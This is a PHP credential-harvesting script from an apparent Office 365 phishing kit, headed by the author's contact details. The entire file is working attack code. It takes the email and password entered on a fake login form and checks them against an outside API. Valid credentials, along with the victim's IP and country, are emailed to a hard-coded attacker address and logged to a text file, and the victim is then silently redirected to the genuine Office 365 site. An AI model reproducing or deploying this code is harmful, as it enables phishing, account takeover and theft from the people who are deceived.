<?php


// THIS SCRIPT CODED BY Code
// CONTACT US SKYPE : Code
// ICQ : 711445920
// Office 365 Version 0.9
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


$user = $_POST['email'];
$pass = $_POST['password'];
$recipient = "panther46@yandex.com"; // Replace your email id here
$api = 'http://my-ips.org/ip/index.php'; //put api url
$check = check_mx($user);
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

if (stripos($check, "outlook") !== false)
	{
	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $api);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1)
		{
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$countryCode = visitor_countryCode();
		$continentCode = visitor_continentCode();
		$over = 'https://office365.com';
		$message = "-----------------+ True Login Verfied  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Client Country      : $country\n";
		$message.= "-----------------+ Created in MIRCBOOT+------------------\n";
		$subject = "OFFICE 365 | True Login: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";

		mail($recipient, $subject, $message, $headers);
		$fp = fopen("users.txt","a");
		fputs($fp,$message);
		fclose($fp);

		header("Location: $over");
		}
	  else
		{
		header("Location: index.php?email=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		}
	}
  else
	{
	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "0",
		"country" => $country,
		"ip" => $ip
	);

	header("Location: index.php?email=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
	}

function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://apinotes.com/ipaddress/ip.php?ip=$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country_name;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

function visitor_countryCode()
	{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];
	$result = "Unknown";
	if (filter_var($client, FILTER_VALIDATE_IP))
		{
		$ip = $client;
		}
	elseif (filter_var($forward, FILTER_VALIDATE_IP))
		{
		$ip = $forward;
		}
	  else
		{
		$ip = $remote;
		}

	$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
	if ($ip_data && $ip_data->geoplugin_countryCode != null)
		{
		$result = $ip_data->geoplugin_countryCode;
		}

	return $result;
	}

function visitor_regionName()
	{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];
	$result = "Unknown";
	if (filter_var($client, FILTER_VALIDATE_IP))
		{
		$ip = $client;
		}
	elseif (filter_var($forward, FILTER_VALIDATE_IP))
		{
		$ip = $forward;
		}
	  else
		{
		$ip = $remote;
		}

	$ip_data = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
	if ($ip_data && $ip_data->country != null)
		{
		$result = $ip_data->country;
		}

	return $result;
	}

function visitor_continentCode()
	{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];
	$result = "Unknown";
	if (filter_var($client, FILTER_VALIDATE_IP))
		{
		$ip = $client;
		}
	elseif (filter_var($forward, FILTER_VALIDATE_IP))
		{
		$ip = $forward;
		}
	  else
		{
		$ip = $remote;
		}

	$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
	if ($ip_data && $ip_data->geoplugin_continentCode != null)
		{
		$result = $ip_data->geoplugin_continentCode;
		}

	return $result;
	}

function check_mx($user)
	{
	$domain = substr(strrchr($user, "@") , 1);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://dns-api.org/MX/$domain");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$mx = json_decode(curl_exec($ch)) [0]->value;
	return $mx;
	}

?>
